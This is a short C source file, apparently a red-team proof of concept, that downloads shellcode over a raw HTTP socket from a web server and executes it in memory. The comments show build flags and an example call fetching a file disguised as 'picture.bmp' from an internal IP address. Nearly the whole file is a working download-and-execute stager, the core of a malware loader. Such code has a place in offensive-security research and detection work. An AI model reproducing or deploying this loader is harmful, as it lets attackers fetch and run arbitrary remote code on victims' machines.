// simple ex for downloading and executing shellcode with sockets from webserver
// wine gcc -s -m32 downloadshellcodebin.c -lwsock32 -lWs2_32
// example call: a.exe http://192.168.2.103/picture.bmp
// https://govolution.wordpress.com/2018/03/02/download-exec-poc-and-dkmc/

#include "WinSock2.h"
#include "Ws2tcpip.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

int main(int argc, char** argv) 
{
	struct WSAData* wd = (struct WSAData*)malloc(sizeof(struct WSAData));
	if (WSAStartup(MAKEWORD(2, 0), wd))
		exit(1);
	free(wd);
	SOCKET sock;
	
	char c;
	int i, j;
	char* file;
	char* host = argv[1];
	struct addrinfo* ai;
	struct addrinfo hints;
	char buf[512];

	if (argc == 3) file = argv[2]; else file = strrchr(argv[1], '/') + 1;
	if (strstr(argv[1], "http://") == argv[1]) host += 7;
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	sprintf(buf, "GET %s HTTP/1.1\r\n", argv[1]);
	*strchr(host, '/') = '\0';
	if (i = getaddrinfo(host, "80", &hints, &ai)) exit(1); 
	sprintf(buf + strlen(buf), "Host: %s\r\n\r\n", host);
	sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
	if (connect(sock, ai->ai_addr, ai->ai_addrlen))
		exit(1);
	freeaddrinfo(ai);
	i = send(sock, buf, strlen(buf), 0);
	if (i < strlen(buf) || i == -1) exit(1);
	while (strcmp(buf, "\r\n")) {
		for (i = 0; strcmp(buf + i - 2, "\r\n"); i++) { recv(sock, buf + i, 1, 0); buf[i + 1] = '\0'; }
		if (strstr(buf, "HTTP/") == buf) {
			if (strcmp(strchr(buf, ' ') + 1, "200 OK\r\n")) exit(1);
		}
		if (strstr(buf, "Content-Length:") == buf) {
			*strchr(buf, '\r') = '\0';
			j = atoi(strchr(buf, ' ') + 1);
		}
	}

	char *sc=(char*)malloc(j * sizeof(char));
	for (i = 0; i < j; i++) 
	{ 
		recv(sock, &c, 1, 0); 
		sc[i]=c;
	}

	closesocket(sock);
	WSACleanup();

	int (*funct)();
	funct = (int (*)()) sc;
	(int)(*funct)(); 

	return 0;
}
